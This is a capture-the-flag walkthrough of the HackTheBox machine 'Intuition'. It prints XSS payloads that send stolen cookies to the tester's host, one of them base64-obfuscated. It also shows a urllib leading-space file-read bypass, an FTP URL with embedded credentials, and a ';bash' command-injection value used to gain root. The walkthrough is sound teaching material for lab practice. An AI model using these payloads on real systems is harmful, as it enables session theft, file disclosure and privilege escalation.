# HackTheBox - Intuition

Enumeration

We start with our nmap scan which reveals a subdomain which we add to our `/etc/hosts` and run a subdomain scan against, to search for any hits.

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 15:09 EDT
Nmap scan report for 10.10.11.15
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://comprezzor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.31 seconds
```

Our wfuzz scan reveals 3 subdomains which we add to our `/etc/hosts` and then begin enumerating.

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Working from the "report" domain we find that we can report an issue, which takes us to the "auth" subdomain which requires us to login.

<figure><img src=".gitbook/assets/qm9A9rvk2H.png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/bg6DWAuwH4.png" alt=""><figcaption></figcaption></figure>

We simply trust the process and create an account which then allows us to submit a report, which is simply a title and text box.

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

We try a simple HTML code injection vulnerability into both text boxes, which if successful, would attempt to retrieve an img from our IP, which we'd be hosting a webserver on. Unfortunately, there is no indication that this has worked with a standard message being displayed.&#x20;

<figure><img src=".gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

## Foothold

Curious to see whether we could use XSS here, we think back [#user](hackthebox-headless.md#user "mention") for the HackTheBox machine, Headless. We try the same payload in each of these fields but to no avail. Let's switch it up a bit and try our good friend, Base64!

```
<img src=a onerror='eval(atob("ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xOTUvP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSk="));' />
```

This payload will attempt to load an image from "a", which will fail. On an error, it will then evaluate (run) the code that follows, which starts with "atob" decodes Base64 string, where our Base64 string is set to make a web request to our web server with the current cookie value. If we're going to trigger an XSS vulnerability, this is a good alternative to our previous payload. This payload however, also fails. Scratching our heads a little bit we take one final attempt at it with

```
<img src=x onerror="fetch('http://10.10.14.195/?cookie='+document.cookie)">
```

Sure enough, we get a hit!

<figure><img src=".gitbook/assets/q1l7P4zEAV.png" alt=""><figcaption></figcaption></figure>

We alter our cookies in the browser storage and sure enough, get onto  the dashboard subdomain as "webdev" where we have our payload...

<figure><img src=".gitbook/assets/tnBrmAEWHK.png" alt=""><figcaption></figcaption></figure>

We click on our request and set it to "high priority" and then resolve it, which triggers our payload once again and this time gives us a different cookie!

<figure><img src=".gitbook/assets/i7KgszIp4K.png" alt=""><figcaption></figcaption></figure>

We repeat the same process as documented again and find ourselves the "admin" user with more functionality now.

<figure><img src=".gitbook/assets/FFNo7Ot8eF.png" alt=""><figcaption></figcaption></figure>

We see that amongst the functionalities we can create a backup and PDF report, creating a backup doesn't appear to do anything that we can see but we can input a url for our PDF report, so we once again try our IP and get an interesting response!

It shows to have worked and then outputs our working directory.

<figure><img src=".gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

## User

Curious for more information we run a Netcat listener which captures the request and although doesn't provide us with much to go off of, gives us a Python urllib version as the User-Agent.

<figure><img src=".gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

Curious whether this is our foothold, we do some Googling and sure enough, we find a file read vulnerability!

{% embed url="https://vsociety.medium.com/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-ee438679351d" %}

The vulnerability is surpisingly quite simple, provide a space at the beginning of the input and then the file to read afterwards, and you can read it. Simple!



We run our POC with:

```
 file:///etc/passwd
```

And sure enough, this works! Since we know we're working with a Python webserver, we can also assume some default locations for it to be running from which we get a hit on

```
 file:///app/code/app.py
```

This works and shows us a list of imports which we can assume are running in the same directory, or in the "blueprints" directory.

<figure><img src=".gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

We test this with&#x20;

```
 file:///app/code/blueprints/report/report.py
```

And get a hit! Great, we have a fair understanding of how this app is setup, let's download all the necessary files and analyse them.



We find useful notes on how the app is setup through the auth and dashboard files but find an admin password in the dashboard file which appears to be related to the FTP server!

<figure><img src=".gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

This is slightly confusing since there is no FTP server running on the machine, and theses creds don't work for the SSH server so we can make an assumption the FTP server is running internally. Luckily, we still have our file read! Since we know our credentials and the DNS resolution for the server from the dashboard blueprint, we can simply just connect and read the base directory.

```
 ftp://ftp_admin:u3jai8y71s2@ftp.local
```

<figure><img src=".gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

A private key? Don't mind if I do. We download the key and decide to check the other files just incase which results in us getting a password for the file and the user, "adam".

<figure><img src=".gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

Well, as we thought. We attempt to use the key as the user "adam" but find that this doesn't work. We do however find that we need to view the comment associated with the key, we do this by changing the password associated with it, which will also make our life of remember.

{% embed url="https://serverfault.com/questions/50775/how-do-i-change-my-private-key-passphrase" %}

<figure><img src=".gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

We find this associated with the user "dev\_acc" through the comment and then log in using our newly set password.

## Lateral Movement

Our first bet once on the box is to investigate the web app further to see whether there was anything that we missed, and sure enough there is!

<figure><img src=".gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

Create! We know the tables in this database, we check for sqlite3 which we have, so decide to get all of the hashes stored in the database in a nicer format.

<figure><img src=".gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

We copy the hashes to our machine and run Hashcat against them which gets us a hit for "adam"

<figure><img src=".gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

We know there's a local FTP server running so connect using our new credentials and download the files present.

<figure><img src=".gitbook/assets/GY2VMag5Xo.png" alt=""><figcaption></figcaption></figure>

Downloading the files we have a bash script that seems to provide checks to ensure that the scripts are running, and then a compiled binary and the C sourcde code for said binary.

<figure><img src=".gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

At this point I figure we have two options, keep enumerating or make a bruteforce tool that will find the last 4 characters of that password. We decide to enumerate and find nothing of use till we run linPEAS and find a weird process running as root, amongst other things runningn as "lopez".

<figure><img src=".gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

Doing our research reveals that Suricata is a threat detection and logging tool, so we look for logs, which we find are present in `/var/log/suricata` which upon further inspection, has lots of files present!

{% embed url="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwisqOeu6sKIAxXCUkEAHfvXD2YQFnoECBIQAw&url=https%3A%2F%2Fnsrc.org%2Fworkshops%2F2015%2Fpacnog17-ws%2Fraw-attachment%2Fwiki%2FTrack2Agenda%2Fex-suricata-config-test.htm%23%3A~%3Atext%3DSuricata%2520logs%2520are%2520located%2520in%2Cnetwork%2520protocols%252C%2520the%2520%27fast.&usg=AOvVaw1CvNFH_hMR-NyGUKDqMRSB&opi=89978449" %}

Let's take a stab for the user lopez and check any of these gunzipped files for things relating to him... Using regular grep won't work here since it's not equipped to deal with compressed files, so we'll use zgrep which is made to deal with these files.

{% embed url="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwi67Oji6sKIAxWiQ0EAHT1XCpsQFnoECBcQAQ&url=https%3A%2F%2Flinux.die.net%2Fman%2F1%2Fzgrep&usg=AOvVaw1lfc33WABaNRC5Rkgrjdqk&opi=89978449" %}

We check for lopez and find a password in teh bottom line of one of these files.

<figure><img src=".gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

With our new creds, we move to Lopez with the aim of figuring out this password as our next objective.

## Root

With our new credentials, we check our home directory which revaels nothing of interest besides an "ansible" folder which we can assume is related to the scripts we analysed earlier. We check for sudo privileges which surprisingly, gives us the "runner2" binary.

<figure><img src=".gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

We decide to run a Hybrid Bruteforce + Mask attack using Hashcat where we input what we know of the password into a file and then run various tests to see if we crack the hash, which eventually works with four uppercase characters.

<figure><img src=".gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

We know we're going to be working with Ansible so Google for how we can become an Admin through Ansible which takes us to this incredibly useful GitHub page...

{% embed url="https://github.com/coopdevs/sys-admins-role" %}

We start by downloading the compressed file from this GitHub page then uploading it to the box.

<figure><img src=".gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

We then create our own JSON file with the required information to install it from our binary, and the authentication password...

```json
{
        "run":{
                "action":"install",
                "role_file":"v0.0.03.tar.gz;bash"
        },
        "auth_code":"UHI75GHINKOP"
}
```

We rename the file on the system to replicate that and then run the script.

<figure><img src=".gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

